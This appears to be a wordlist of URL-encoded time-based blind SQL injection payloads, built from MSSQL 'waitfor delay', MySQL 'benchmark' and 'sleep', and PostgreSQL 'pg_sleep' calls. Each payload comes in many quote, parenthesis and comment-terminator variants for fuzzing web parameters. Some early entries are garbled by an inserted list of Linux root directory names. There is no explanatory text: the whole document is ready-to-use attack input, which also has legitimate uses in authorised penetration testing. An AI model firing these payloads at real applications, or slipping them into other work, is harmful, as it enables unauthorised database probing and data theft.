+%29%29%29+waitfor+delay+%270%3a0%3a20%27+%2fbin+%2fboot+%2fdev+%2fetc+%2fhome+%2finit+%2flib+%2flib64+%2flost%2bfound+%2fmnt+%2fopt+%2fproc+%2fREADME+%2froot+%2frun+%2fsbin+%2fsrv+%2fsys+%2ftmp+%2fusr+%2fvar%0a
+%29%29%29+waitfor+delay+%270%3a0%3a20%27+--%0a
+%29%29%29%29+waitfor+delay+%270%3a0%3a20%27+%2fbin+%2fboot+%2fdev+%2fetc+%2fhome+%2finit+%2flib+%2flib64+%2flost%2bfound+%2fmnt+%2fopt+%2fproc+%2fREADME+%2froot+%2frun+%2fsbin+%2fsrv+%2fsys+%2ftmp+%2fusr+%2fvar%0a
+%29%29%29%29+waitfor+delay+%270%3a0%3a20%27+--%0a
+%29%29%29%29%29+waitfor+delay+%270%3a0%3a20%27+--%0a
+%29%29%29%29%29%29+waitfor+delay+%270%3a0%3a20%27+--%0a
+%27%29+waitfor+delay+%270%3a0%3a20%27+%2fbin+%2fboot+%2fdev+%2fetc+%2fhome+%2finit+%2flib+%2flib64+%2flost%2bfound+%2fmnt+%2fopt+%2fproc+%2fREADME+%2froot+%2frun+%2fsbin+%2fsrv+%2fsys+%2ftmp+%2fusr+%2fvar%0a
+%27%29+waitfor+delay+%270%3a0%3a20%27+--%0a
+"%29+waitfor+delay+%270%3a0%3a20%27+%2fbin+%2fboot+%2fdev+%2fetc+%2fhome+%2finit+%2flib+%2flib64+%2flost%2bfound+%2fmnt+%2fopt+%2fproc+%2fREADME+%2froot+%2frun+%2fsbin+%2fsrv+%2fsys+%2ftmp+%2fusr+%2fvar%0a
+"%29+waitfor+delay+%270%3a0%3a20%27+--%0a
+%27%29%29+waitfor+delay+%270%3a0%3a20%27+%2fbin+%2fboot+%2fdev+%2fetc+%2fhome+%2finit+%2flib+%2flib64+%2flost%2bfound+%2fmnt+%2fopt+%2fproc+%2fREADME+%2froot+%2frun+%2fsbin+%2fsrv+%2fsys+%2ftmp+%2fusr+%2fvar%0a
+%27%29%29+waitfor+delay+%270%3a0%3a20%27+--%0a
+"%29%29+waitfor+delay+%270%3a0%3a20%27+%2fbin+%2fboot+%2fdev+%2fetc+%2fhome+%2finit+%2flib+%2flib64+%2flost%2bfound+%2fmnt+%2fopt+%2fproc+%2fREADME+%2froot+%2frun+%2fsbin+%2fsrv+%2fsys+%2ftmp+%2fusr+%2fvar%0a
+"%29%29+waitfor+delay+%270%3a0%3a20%27+--%0a
+%27%29%29%29+waitfor+delay+%270%3a0%3a20%27+%2fbin+%2fboot+%2fdev+%2fetc+%2fhome+%2finit+%2flib+%2flib64+%2flost%2bfound+%2fmnt+%2fopt+%2fproc+%2fREADME+%2froot+%2frun+%2fsbin+%2fsrv+%2fsys+%2ftmp+%2fusr+%2fvar%0a
+%27%29%29%29+waitfor+delay+%270%3a0%3a20%27+--%0a
+"%29%29%29+waitfor+delay+%270%3a0%3a20%27+%2fbin+%2fboot+%2fdev+%2fetc+%2fhome+%2finit+%2flib+%2flib64+%2flost%2bfound+%2fmnt+%2fopt+%2fproc+%2fREADME+%2froot+%2frun+%2fsbin+%2fsrv+%2fsys+%2ftmp+%2fusr+%2fvar%0a
+"%29%29%29+waitfor+delay+%270%3a0%3a20%27+--%0a
+%27%29%29%29%29+waitfor+delay+%270%3a0%3a20%27+%2fbin+%2fboot+%2fdev+%2fetc+%2fhome+%2finit+%2flib+%2flib64+%2flost%2bfound+%2fmnt+%2fopt+%2fproc+%2fREADME+%2froot+%2frun+%2fsbin+%2fsrv+%2fsys+%2ftmp+%2fusr+%2fvar%0a
+%27%29%29%29%29+waitfor+delay+%270%3a0%3a20%27+--%0a
+"%29%29%29%29+waitfor+delay+%270%3a0%3a20%27+%2fbin+%2fboot+%2fdev+%2fetc+%2fhome+%2finit+%2flib+%2flib64+%2flost%2bfound+%2fmnt+%2fopt+%2fproc+%2fREADME+%2froot+%2frun+%2fsbin+%2fsrv+%2fsys+%2ftmp+%2fusr+%2fvar%0a
+"%29%29%29%29+waitfor+delay+%270%3a0%3a20%27+--%0a
+%27%29%29%29%29%29+waitfor+delay+%270%3a0%3a20%27+%2fbin+%2fboot+%2fdev+%2fetc+%2fhome+%2finit+%2flib+%2flib64+%2flost%2bfound+%2fmnt+%2fopt+%2fproc+%2fREADME+%2froot+%2frun+%2fsbin+%2fsrv+%2fsys+%2ftmp+%2fusr+%2fvar%0a
+%27%29%29%29%29%29+waitfor+delay+%270%3a0%3a20%27+--%0a
+"%29%29%29%29%29+waitfor+delay+%270%3a0%3a20%27+%2fbin+%2fboot+%2fdev+%2fetc+%2fhome+%2finit+%2flib+%2flib64+%2flost%2bfound+%2fmnt+%2fopt+%2fproc+%2fREADME+%2froot+%2frun+%2fsbin+%2fsrv+%2fsys+%2ftmp+%2fusr+%2fvar%0a
+"%29%29%29%29%29+waitfor+delay+%270%3a0%3a20%27+--%0a
+%27%29%29%29%29%29%29+waitfor+delay+%270%3a0%3a20%27+%2fbin+%2fboot+%2fdev+%2fetc+%2fhome+%2finit+%2flib+%2flib64+%2flost%2bfound+%2fmnt+%2fopt+%2fproc+%2fREADME+%2froot+%2frun+%2fsbin+%2fsrv+%2fsys+%2ftmp+%2fusr+%2fvar%0a
+%27%29%29%29%29%29%29+waitfor+delay+%270%3a0%3a20%27+--%0a
+"%29%29%29%29%29%29+waitfor+delay+%270%3a0%3a20%27+%2fbin+%2fboot+%2fdev+%2fetc+%2fhome+%2finit+%2flib+%2flib64+%2flost%2bfound+%2fmnt+%2fopt+%2fproc+%2fREADME+%2froot+%2frun+%2fsbin+%2fsrv+%2fsys+%2ftmp+%2fusr+%2fvar%0a
+"%29%29%29%29%29%29+waitfor+delay+%270%3a0%3a20%27+--%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%29%2520%2f%2a%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%29%2520--%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%29%2520%2523%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%29%2520%2f%2a%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%29%2520--%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%29%2520%2523%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%29%2520%2f%2a%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%29%2520--%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%29%2520%2523%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%29%2520%2f%2a%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%29%2520--%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%29%2520%2523%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%29%2520%2f%2a%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%29%2520--%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%29%2520%2523%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%29%2520%2f%2a%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%29%2520--%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%29%2520%2523%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%29%2520%2f%2a%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%29%2520--%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%29%2520%2523%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%29%2520%2f%2a%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%29%2520--%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%29%2520%2523%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%29%2520%2f%2a%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%29%2520--%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%29%2520%2523%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%29%2520%2f%2a%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%29%2520--%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%29%2520%2523%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%29%2520%2f%2a%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%29%2520--%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%29%2520%2523%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%29%2520%2f%2a%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%29%2520--%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%29%2520%2523%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2f%2a%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%29%2520--%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2523%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2f%2a%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%29%2520--%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2523%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2f%2a%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%29%2520--%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2523%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2f%2a%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520--%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2523%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2f%2a%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520--%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2523%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2f%2a%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520--%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2523%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2f%2a%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520--%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2523%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2f%2a%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520--%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2523%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2f%2a%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520--%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2523%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2f%2a%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520--%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2523%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2f%2a%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520--%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2523%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2f%2a%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520--%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2523%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2f%2a%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520--%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2523%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2f%2a%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520--%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2523%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2f%2a%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520--%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2523%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2f%2a%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520--%0a
+%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2523%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2f%2a%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520--%0a
+%27%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2523%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2f%2a%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520--%0a
+"%2bif%28benchmark%283000000%2cMD5%281%29%29%2cNULL%2cNULL%29%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%2cNULL%29%2520%2523%0a
+%2c%28select%2520if%28count%28%2a%29%21%3d-1%2cbenchmark%283000000%2cMD5%281%29%29%2cbenchmark%283000000%2cMD5%281%29%29%29%29%2f%2a%0a
+%2c%28select%2520if%28count%28%2a%29%21%3d-1%2cbenchmark%283000000%2cMD5%281%29%29%2cbenchmark%283000000%2cMD5%281%29%29%29%29--%0a
+%2c%28select%2520if%28count%28%2a%29%21%3d-1%2cbenchmark%283000000%2cMD5%281%29%29%2cbenchmark%283000000%2cMD5%281%29%29%29%29%2523%0a
+%27%2c%28select%2520if%28count%28%2a%29%21%3d-1%2cbenchmark%283000000%2cMD5%281%29%29%2cbenchmark%283000000%2cMD5%281%29%29%29%29%2f%2a%0a
+%27%2c%28select%2520if%28count%28%2a%29%21%3d-1%2cbenchmark%283000000%2cMD5%281%29%29%2cbenchmark%283000000%2cMD5%281%29%29%29%29--%0a
+%27%2c%28select%2520if%28count%28%2a%29%21%3d-1%2cbenchmark%283000000%2cMD5%281%29%29%2cbenchmark%283000000%2cMD5%281%29%29%29%29%2523%0a
+"%2c%28select%2520if%28count%28%2a%29%21%3d-1%2cbenchmark%283000000%2cMD5%281%29%29%2cbenchmark%283000000%2cMD5%281%29%29%29%29%2f%2a%0a
+"%2c%28select%2520if%28count%28%2a%29%21%3d-1%2cbenchmark%283000000%2cMD5%281%29%29%2cbenchmark%283000000%2cMD5%281%29%29%29%29--%0a
+"%2c%28select%2520if%28count%28%2a%29%21%3d-1%2cbenchmark%283000000%2cMD5%281%29%29%2cbenchmark%283000000%2cMD5%281%29%29%29%29%2523%0a
+%29%2c%28select%2520if%28count%28%2a%29%21%3d-1%2cbenchmark%283000000%2cMD5%281%29%29%2cbenchmark%283000000%2cMD5%281%29%29%29%29%2f%2a%0a
+%29%2c%28select%2520if%28count%28%2a%29%21%3d-1%2cbenchmark%283000000%2cMD5%281%29%29%2cbenchmark%283000000%2cMD5%281%29%29%29%29--%0a
+%29%2c%28select%2520if%28count%28%2a%29%21%3d-1%2cbenchmark%283000000%2cMD5%281%29%29%2cbenchmark%283000000%2cMD5%281%29%29%29%29%2523%0a
+%27%29%2c%28select%2520if%28count%28%2a%29%21%3d-1%2cbenchmark%283000000%2cMD5%281%29%29%2cbenchmark%283000000%2cMD5%281%29%29%29%29%2f%2a%0a
+%27%29%2c%28select%2520if%28count%28%2a%29%21%3d-1%2cbenchmark%283000000%2cMD5%281%29%29%2cbenchmark%283000000%2cMD5%281%29%29%29%29--%0a
+%27%29%2c%28select%2520if%28count%28%2a%29%21%3d-1%2cbenchmark%283000000%2cMD5%281%29%29%2cbenchmark%283000000%2cMD5%281%29%29%29%29%2523%0a
+"%29%2c%28select%2520if%28count%28%2a%29%21%3d-1%2cbenchmark%283000000%2cMD5%281%29%29%2cbenchmark%283000000%2cMD5%281%29%29%29%29%2f%2a%0a
+"%29%2c%28select%2520if%28count%28%2a%29%21%3d-1%2cbenchmark%283000000%2cMD5%281%29%29%2cbenchmark%283000000%2cMD5%281%29%29%29%29--%0a
+"%29%2c%28select%2520if%28count%28%2a%29%21%3d-1%2cbenchmark%283000000%2cMD5%281%29%29%2cbenchmark%283000000%2cMD5%281%29%29%29%29%2523%0a
+and+0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2f%2a%0a
+and+0%3dbenchmark%283000000%2cMD5%281%29%29%2520--%0a
+and+0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2523%0a
+%27+and+0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2f%2a%0a
+%27+and+0%3dbenchmark%283000000%2cMD5%281%29%29%2520--%0a
+%27+and+0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2523%0a
+"+and+0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2f%2a%0a
+"+and+0%3dbenchmark%283000000%2cMD5%281%29%29%2520--%0a
+"+and+0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2523%0a
+%29+and+0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2f%2a%0a
+%29+and+0%3dbenchmark%283000000%2cMD5%281%29%29%2520--%0a
+%29+and+0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2523%0a
+%29%29+and+0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2f%2a%0a
+%29%29+and+0%3dbenchmark%283000000%2cMD5%281%29%29%2520--%0a
+%29%29+and+0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2523%0a
+%29%29%29+and+0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2f%2a%0a
+%29%29%29+and+0%3dbenchmark%283000000%2cMD5%281%29%29%2520--%0a
+%29%29%29+and+0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2523%0a
+%29%29%29%29+and+0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2f%2a%0a
+%29%29%29%29+and+0%3dbenchmark%283000000%2cMD5%281%29%29%2520--%0a
+%29%29%29%29+and+0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2523%0a
+%27%29+and+0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2f%2a%0a
+%27%29+and+0%3dbenchmark%283000000%2cMD5%281%29%29%2520--%0a
+%27%29+and+0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2523%0a
+"%29+and+0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2f%2a%0a
+"%29+and+0%3dbenchmark%283000000%2cMD5%281%29%29%2520--%0a
+"%29+and+0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2523%0a
+%27%29%29+and+0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2f%2a%0a
+%27%29%29+and+0%3dbenchmark%283000000%2cMD5%281%29%29%2520--%0a
+%27%29%29+and+0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2523%0a
+"%29%29+and+0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2f%2a%0a
+"%29%29+and+0%3dbenchmark%283000000%2cMD5%281%29%29%2520--%0a
+"%29%29+and+0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2523%0a
+%27%29%29%29+and+0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2f%2a%0a
+%27%29%29%29+and+0%3dbenchmark%283000000%2cMD5%281%29%29%2520--%0a
+%27%29%29%29+and+0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2523%0a
+"%29%29%29+and+0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2f%2a%0a
+"%29%29%29+and+0%3dbenchmark%283000000%2cMD5%281%29%29%2520--%0a
+"%29%29%29+and+0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2523%0a
+%27%29%29%29%29+and+0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2f%2a%0a
+%27%29%29%29%29+and+0%3dbenchmark%283000000%2cMD5%281%29%29%2520--%0a
+%27%29%29%29%29+and+0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2523%0a
+"%29%29%29%29+and+0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2f%2a%0a
+"%29%29%29%29+and+0%3dbenchmark%283000000%2cMD5%281%29%29%2520--%0a
+"%29%29%29%29+and+0%3dbenchmark%283000000%2cMD5%281%29%29%2520%2523%0a
+sleep%285%29%23%0a
+1+or+sleep%285%29%23%0a
+"+or+sleep%285%29%23%0a
+%27+or+sleep%285%29%23%0a
+"+or+sleep%285%29%3d"%0a
+%27+or+sleep%285%29%3d%27%0a
+1%29+or+sleep%285%29%23%0a
+"%29+or+sleep%285%29%3d"%0a
+%27%29+or+sleep%285%29%3d%27%0a
+1%29%29+or+sleep%285%29%23%0a
+"%29%29+or+sleep%285%29%3d"%0a
+%27%29%29+or+sleep%285%29%3d%27%0a
+%3bwaitfor+delay+%270%3a0%3a5%27--%0a
+%29%3bwaitfor+delay+%270%3a0%3a5%27--%0a
+%27%3bwaitfor+delay+%270%3a0%3a5%27--%0a
+"%3bwaitfor+delay+%270%3a0%3a5%27--%0a
+%27%29%3bwaitfor+delay+%270%3a0%3a5%27--%0a
+"%29%3bwaitfor+delay+%270%3a0%3a5%27--%0a
+%29%29%3bwaitfor+delay+%270%3a0%3a5%27--%0a
+%27%29%29%3bwaitfor+delay+%270%3a0%3a5%27--%0a
+"%29%29%3bwaitfor+delay+%270%3a0%3a5%27--%0a
+benchmark%2810000000%2cMD5%281%29%29%23%0a
+1+or+benchmark%2810000000%2cMD5%281%29%29%23%0a
+"+or+benchmark%2810000000%2cMD5%281%29%29%23%0a
+%27+or+benchmark%2810000000%2cMD5%281%29%29%23%0a
+1%29+or+benchmark%2810000000%2cMD5%281%29%29%23%0a
+"%29+or+benchmark%2810000000%2cMD5%281%29%29%23%0a
+%27%29+or+benchmark%2810000000%2cMD5%281%29%29%23%0a
+1%29%29+or+benchmark%2810000000%2cMD5%281%29%29%23%0a
+"%29%29+or+benchmark%2810000000%2cMD5%281%29%29%23%0a
+%27%29%29+or+benchmark%2810000000%2cMD5%281%29%29%23%0a
+pg_sleep%285%29--%0a
+1+or+pg_sleep%285%29--%0a
+"+or+pg_sleep%285%29--%0a
+%27+or+pg_sleep%285%29--%0a
+1%29+or+pg_sleep%285%29--%0a
+"%29+or+pg_sleep%285%29--%0a
+%27%29+or+pg_sleep%285%29--%0a
+1%29%29+or+pg_sleep%285%29--%0a
+"%29%29+or+pg_sleep%285%29--%0a
+%27%29%29+or+pg_sleep%285%29--%0a
+AND+%28SELECT+a.txt+b.txt+FROM+%28SELECT%28SLEEP%285%29%29%29bAKL%29+AND+%27vRxe%27%3d%27vRxe%0a
